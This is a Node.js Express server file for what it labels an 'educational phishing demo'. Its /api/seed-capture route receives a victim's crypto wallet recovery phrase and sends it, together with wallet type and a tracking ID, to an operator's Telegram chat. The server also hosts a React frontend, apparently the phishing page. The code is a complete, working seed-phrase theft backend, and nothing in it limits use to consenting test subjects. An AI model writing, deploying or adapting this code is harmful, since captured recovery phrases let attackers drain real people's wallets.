// server/server.js
import dns from 'node:dns'
import express from 'express'
import cors from 'cors'
import axios from 'axios'
import dotenv from 'dotenv'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

dns.setDefaultResultOrder('ipv4first')
dotenv.config()

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)

const app = express()
app.use(cors())
app.use(express.json())

const PORT = process.env.PORT || 3001

// =====================================================================
// Seed capture → Telegram
// =====================================================================
app.post('/api/seed-capture', async (req, res) => {
  const { wallet, phrase, wordCount, trackingId, userAgent, timestamp } = req.body || {}
  if (!phrase) return res.status(400).json({ error: 'Missing phrase' })

  console.log('\n=== PHISHING SIMULATION — SEED CAPTURED ===')
  console.log('Wallet:', wallet, '| Words:', wordCount, '| ID:', trackingId)

  const BOT  = process.env.TELEGRAM_BOT_TOKEN
  const CHAT = process.env.TELEGRAM_CHAT_ID
  if (BOT && CHAT) {
    const text = [
      '🎣 *EDUCATIONAL PHISHING DEMO*',
      '',
      `*Wallet:* ${wallet}`,
      `*Words:* ${wordCount}`,
      `*Tracking ID:* ${trackingId}`,
      `*Time:* ${timestamp}`,
      '',
      '`' + phrase + '`',
    ].join('\n')
    try {
      await axios.post(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        chat_id: CHAT, text, parse_mode: 'Markdown',
      })
      console.log('✅ Sent to Telegram')
    } catch (err) {
      console.error('Telegram failed:', err.message)
    }
  }
  res.json({ success: true, trackingId })
})

app.get('/api/health', (req, res) => res.json({ ok: true }))

// =====================================================================
// Serve the built React frontend from /dist
// =====================================================================
app.use(express.static(path.join(__dirname, 'dist')))

// Any non-API route → React index.html (for React Router)
app.get(/^\/(?!api).*/, (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'))
})

app.listen(PORT, () => console.log(`Backend listening on http://localhost:${PORT}`))